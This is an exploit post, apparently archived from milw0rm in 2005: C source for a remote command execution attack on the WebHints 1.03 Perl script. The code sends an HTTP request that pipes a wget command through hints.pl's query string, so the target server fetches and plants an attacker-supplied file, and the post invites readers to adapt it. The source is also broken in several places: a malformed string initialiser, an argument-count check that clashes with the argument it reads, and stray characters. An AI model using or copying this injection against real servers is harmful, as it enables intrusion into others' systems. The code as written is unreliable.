<html>
<head>
<title>Webhints <= 1.03 Remote Command Execution Exploit (c code) (2)</title>
</head>
<pre>
/*
**************************************************************************************
*        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           *
**************************************************************************************
 EXPLOIT FOR :  WebHints Remote C0mmand Execution Vuln

Coded By: A l p h a _ P r o g r a m m e r  (Sirus-v)
E-Mail: Alpha_Programmer@Yahoo.Com

This Xpl Upload a Page in Vulnerable Directory , You can Change This Code For Yourself

**************************************************************************************
* GR33tz T0 ==&gt;     mh_p0rtal  --  oil_Karchack  --  The-CephaleX  -- Str0ke         *
*And Iranian Security &amp; Technical Sites:                                             *
*                                                                                    *
*         TechnoTux.Com , IranTux.Com , Iranlinux.ORG , Barnamenevis.ORG             *
*      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &amp;  GrayHatz.NeT      *
**************************************************************************************
*/
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(lib, &quot;ws2_32.lib&quot;)
#include &lt;winsock2.h&gt;


#define MY_PORT 80
#define BUF_LEN 256
/**************************************************************************************/
int main(int arg_c, char *arg_v[])
{
       static const char cmd[] = &quot;GET %chints.pl?|wget %c| HTTP/1.0\r\n\r\n&quot; , arg_v[2] , arg_v[3];

       struct sockaddr_in their_adr;
       char buf[BUF_LEN];
       struct hostent *he;
       int sock, i;
       WSADATA wsdata;

/* Winsock start up */
       WSAStartup(0x0101, &amp;wsdata);
       atexit((void (*)(void))WSACleanup);

       if(arg_c != 3)
       {
               printf(&quot;=========================================================\n&quot;);
               printf(&quot;  Webhints Exploit By Alpha_Programmer\n&quot;);
               printf(&quot;   Trap-set Underground Hacking Team\n&quot;);
               printf(&quot;   Usage : webhints.exe [Targ3t] [DIR] [File Address]\n&quot;);
               printf(&quot;=========================================================\n&quot;);
               return 1;
       }
/* create socket */
printf(&quot;calling socket()...\n&quot;);
       sock = socket(AF_INET, SOCK_STREAM, 0);

/* get IP address of other end */
printf(&quot;calling gethostbyname()...\n&quot;);
       he = gethostbyname(arg_v[1]);
       if(he == NULL)
       {
               printf(&quot;can't get IP address of host '%s'\n&quot;, arg_v[1]);
               return 1;
       }
       memset(&amp;their_adr, 0, sizeof(their_adr));
       their_adr.sin_family = AF_INET;
       memcpy(&amp;their_adr.sin_addr, he-&gt;h_addr, he-&gt;h_length);
       their_adr.sin_port = htons(MY_PORT);
/* connect */
printf(&quot;C0nnecting...\n&quot;);
       i = connect(sock, (struct sockaddr *)&amp;their_adr, sizeof(their_adr));
       if(i != 0)
       {
               printf(&quot;C0nnect() returned %d, errno=%d\n&quot;, i, errno);
               return 1;
       }
/* send H3ll C0mmand */
printf(&quot;Sending H3ll Packets...\n&quot;);
       i = send(sock, cmd, sizeof(cmd), 0);
       if(i != sizeof(cmd))
       {
               printf(&quot;Send. returned %d, errno=%d\n&quot;, i, errno);
               return 1;
       }\n
               printf(&quot;OK ... Now You Can Test your file in hints.pl Directory\n&quot;):

       closesocket(sock);
       return 0;
}

// milw0rm.com [2005-06-11]
</pre>
</html>

